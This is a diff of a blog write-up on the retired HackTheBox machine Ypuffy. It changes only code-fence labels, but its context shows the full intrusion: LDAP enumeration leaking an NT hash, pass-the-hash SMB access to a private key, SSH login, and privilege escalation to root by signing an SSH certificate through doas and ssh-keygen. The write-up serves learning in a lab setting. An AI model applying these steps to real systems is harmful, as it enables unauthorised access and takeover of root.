@@ -7,7 +7,7 @@ This first post is going to a write up on the newly retired machine Ypuffy from 
 Nmap Output
 -----------
 
-```shell_session
+```shell
 root@kali:~/Documents/htb/boxes/Ypuffy# nmap -sV -sC -oA nmap/initial 10.10.10.107
 Starting Nmap 7.70 ( https://nmap.org ) at 2019-02-09 20:05 EST
 Nmap scan report for 10.10.10.107
@@ -60,7 +60,7 @@ HTTP (OpenBSD httpd)
 
 I first start out with a classic `curl` command which returns the following:
 
-```shell_session
+```shell
 root@kali:~/Documents/htb/boxes/Ypuffy# curl -v http://10.10.10.107
 *   Trying 10.10.10.107...
 * TCP_NODELAY set
@@ -78,7 +78,7 @@ root@kali:~/Documents/htb/boxes/Ypuffy#
 
 This is getting a bit weird... Moving on to try and enumerate any directories, hoping maybe that something was just up with request I made, I fire off a gobuster scan which returns the following:
 
-```shell_session
+```shell
 root@kali:~/Documents/htb/boxes/Ypuffy# gobuster -u http://10.10.10.107 -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt                        
 
 =====================================================
@@ -107,7 +107,7 @@ LDAP (Port 389)
 
 I searched around for different ways to enumerate LDAP on a BSD host, and I found a few nmap scripts that would be helpful. I started with the module `ldap-search` which enumerates ldap for different directories within it. My syntax for this was `nmap -p 389 --script ldap-search 10.10.10.107` which returned something interesting:
 
-```shell_session
+```shell
      userPassword: {BSDAUTH}alice1978                                                                                                                            
      homeDirectory: /home/alice1978                                                                                                                              
      loginShell: /bin/ksh                                                                                                                                        
@@ -117,7 +117,7 @@ I searched around for different ways to enumerate LDAP on a BSD host, and I foun
 
 This looks to be an NTLM hash for SMB (which we also saw open on this host!). This is great, I kept following this trail. I then moved over to `smbclient` to try and see if I could get anything from this hash. Running `smbclient -U alice1978 --pw-nt-hash -L 10.10.10.107` provided some useful information below:
 
-```shell_session
+```shell
     Sharename       Type      Comment                                                                                                                            
     ---------       ----      -------                                                                                                                            
     alice           Disk      Alice's Windows Directory                                                                                                          
@@ -129,7 +129,7 @@ Looks like we have the default IPC$ directory along with a custom directory. The
 Let's enumerate this `alice` share a bit more!
 
 
-```shell_session
+```shell
 root@kali:~/Documents/htb/boxes/Ypuffy# smbclient -U alice1978 --pw-nt-hash \\\\10.10.10.107\\alice                                                            
 Enter WORKGROUP\alice1978's password:
 Try "help" to get a list of possible commands.
@@ -148,7 +148,7 @@ First, I installed puttygen by running `apt install putty-tools` on my Kali mach
 
 One this is complete, we can try and test it on the box!
 
-```shell_session
+```shell
 root@kali:~/Documents/htb/boxes/Ypuffy# chmod 600 alice_key.key 
 root@kali:~/Documents/htb/boxes/Ypuffy# ssh -i alice_key.key alice1978@10.10.10.107
 The authenticity of host '10.10.10.107 (10.10.10.107)' can't be established.
@@ -181,7 +181,7 @@ Privilege Escalation
 
 Since this is an OpenBSD host, many things will be different than on the Linux environments seen before on HackTheBox. The first thing that really tripped me up was the fact that `sudo` was not a thing on this host. Doing some research shows that OpenBSD has a similar tools called `doas`. Normally the first thing I will check when getting access to a machine is if the user I am has any sudo permissions. There doesn't seem to be a way to do this on OpenBSD machines using `doas`, but ther is a configuration file that we can look at that will tell us similar information.
 
-```shell_session
+```shell
 ypuffy$ cat /etc/doas.conf                                                                                                                                     
 permit keepenv :wheel
 permit nopass alice1978 as userca cmd /usr/bin/ssh-keygen
@@ -196,7 +196,7 @@ Getting root with ssh-keygen
 
 So since ssh seems to be our vector to obtain root, I first looked at the sshd config file. This contained a few interesting lines that aren't normal to see.
 
-```shell_session
+```shell
 TrustedUserCAKeys /home/userca/ca.pub
 AuthorizedPrincipalsCommand /usr/local/bin/curl http://127.0.0.1/sshauth?type=principals&username=%u
 AuthorizedPrincipalsCommandUser nobody
@@ -215,7 +215,7 @@ Leveraging ssh-keygen to get root
 
 So we know the command we need to run in order to get the principals to create signed keys for any user using the `curl` command seen in the sshd configuration file. Running this against the user `root` reveals the principal as seen below:
 
-```shell_session
+```shell
 ypuffy$ curl "http://127.0.0.1/sshauth?type=principals&username=root"
 3m3rgencyB4ckd00r
 ypuffy$
@@ -236,7 +236,7 @@ After this I run the command that was seen in the doas configuration file: `doas
 
 Now that we have these in place, all we need to do is copy over the new certification file (in this case it will be named "id_rsa-cert.pub") to where our private and public key pairs are hosted on our Kali box. Once this is done we can then SSH as root into Ypuffy as seen below:
 
-```shell_session
+```shell
 root@kali:~/Documents/htb/boxes/Ypuffy# ssh -i id_rsa 10.10.10.107
 OpenBSD 6.3 (GENERIC) #100: Sat Mar 24 14:17:45 MDT 2018
 
